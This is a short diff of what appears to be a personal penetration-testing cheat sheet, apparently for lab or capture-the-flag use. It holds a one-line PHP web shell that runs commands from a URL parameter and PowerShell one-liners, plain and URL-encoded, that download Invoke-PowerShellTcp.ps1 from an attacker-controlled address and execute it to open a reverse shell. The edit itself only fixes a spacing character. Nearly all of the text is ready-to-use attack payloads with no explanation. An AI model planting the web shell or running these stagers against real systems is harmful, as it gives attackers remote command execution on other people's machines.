@@ -13,7 +13,7 @@ echo "<pre>$output</pre>";
 <?php shell_exec($_GET['cmd']); ?>
 
 #Powerhshell get file from server:
-powershell.exe IEX(New-Object+Net.WebClient).downloadString('http://10.10.16.65/Invoke-PowerShellTcp.ps1')
+powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.16.65/Invoke-PowerShellTcp.ps1')
 #URL Encoded:
 powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.16.65/Invoke-PowerShellTcp.ps1')
 
